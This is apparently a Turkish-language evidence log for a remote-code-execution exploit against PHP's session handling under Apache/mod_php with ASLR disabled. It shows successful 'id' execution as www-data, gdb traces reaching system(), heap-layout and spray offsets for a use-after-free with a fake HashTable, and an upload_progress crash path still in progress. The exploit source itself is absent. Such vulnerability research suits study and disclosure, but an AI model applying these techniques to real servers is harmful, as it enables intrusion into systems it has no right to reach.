# Kanıt alıntıları (no-ASLR Apache/mod_php RCE)

## 1. Komut yürütme kanıtı

Uzak `/tmp/x`:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ardışık 5 kez (aynı ASLR'siz yapılandırma, worker çöktükten sonra prefork yeniden kurar):

```text
RUN 1 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
RUN 2 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
RUN 3 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
RUN 4 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
RUN 5 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

PoC SHA-256:

```text
54b1617309c5da7567fbaa2cbb4b3353a54aa9189871e3e3799c27f5e6dda9f2  tools/d.php
```

## 2. ASLR karşılaştırması

```text
ASLR_ON: personality=00000000
ASLR_ON_FAIL_AS_EXPECTED

ASLR_OFF: personality=00040000
ASLR_OFF_OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 3. gdb system isabeti

Dosya: `logs/g16_system_trace.log`

```text
SYSTEM rdi=0x7ffff5e045a0 cmd=id>/tmp/x
#0  __libc_system (line=0x7ffff5e045a0 "id>/tmp/x")
#1  0x00007ffff49cbc9d in zend_hash_destroy (ht=ht@entry=0x7ffff5e04580)
#2  0x00007ffff49cbff8 in zend_array_destroy (ht=0x7ffff5e04580)
#3  0x00007ffff49cc20e in zend_hash_clean (ht=0x7ffff5e031c0)
#4  0x00007ffff47e976f in zif_session_unset (execute_data=<optimized out>,
#5  zif_session_unset (execute_data=<optimized out>,
#6  0x00007ffff49ba644 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER ()
#7  execute_ex (ex=0x7ffff5e045a0)
```

## 4. Gerçek session dizisi yerleşimi

Dosya: `logs/g17_clean_mask.log`

```text
CLEAN ht=0x7ffff5e031c0 size=8 mask=fffffff0 numused=8 arData=0x7ffff5e04540 allocstart=0x7ffff5e04500
```

Yani: `arData = tahsis başlangıcı + 0x40` (hash bölgesi 0x40 bayt), eski arData 320 baytlık bin'dedir.

## 5. UAF sonrası eski arData'nın belleği (sprey bloğu düşüş noktası)

Dosya: `logs/g15_uaf_memory.log` (eski payload offset 0x40'ın OLD'a düştüğü sürüm)

```text
SIGSEGV addr=0x100000005 rip=0x7ffff49cc217
OLD memory:
0x7ffff5e04540: 0x0000000700000001 0xfffffff800000010
0x7ffff5e04550: 0x00007ffff5e045a0 0x0000000100000001
0x7ffff5e04560: 0x2f706d742f3e6469 0x0000000000000078
0x7ffff5e04570: 0x00007ffff7d13490 0x0000000000000000
...
```

Bu çökme, clean bucket0 key'ini okurken (sprey bloğuyla `0x100000001`'e yazılmış) gerçekleşir;
yerleşim ayarlandıktan sonra (bucket0 key=0 tutularak) fake zval/fake HashTable'a girilir ve system isabet edilir.

## 6. upload_progress A/B hattı (çökme durumu)

İstek A: multipart + `PHP_SESSION_UPLOAD_PROGRESS` + dosya + 12MB alan:

```text
HTTP/1.1 200 OK
Allowed memory size of 8388608 bytes exhausted (tried to allocate 2098791 bytes)
```

İstek A sonrası gdb (shutdown yok):

```text
ps_globals.http_session_vars:
  type=0x10a (IS_REFERENCE), ptr=0x7ffff5e02320
  0x7ffff5e02320: refcount=2, val=0x7ffff5e03230 (IS_ARRAY)
ps_globals.id = 0x7ffff5e600c0
```

İstek B (yalnızca PHPSESSID + progress alanı, dosyasız):

```text
TRACK psvars=0x7ffff5e02320 ti=10a
PS_DTOR type=10a ptr=0x7ffff5e02320
PS_DTOR type=10a ptr=0x7ffff5e01240
TRACK psvars=0x7ffff5e01240 ti=0
REF_DESTROY 0x7ffff5e01240 rc=0 val=0x7ffff5e02150 ti=307
ARR_DESTROY arr=0x7ffff5e02150 flags=8 numused=0
SIGSEGV in _IO_new_fclose(fp=0xffffffff)
```

Bu hat şu anda kesin istekler-arası durum kalıntısı + tekrarlanabilir çökmedir, 320 baytlık
kontrollü yeniden işgal/fake HashTable'ı bağlamak hâlâ gerekiyor.
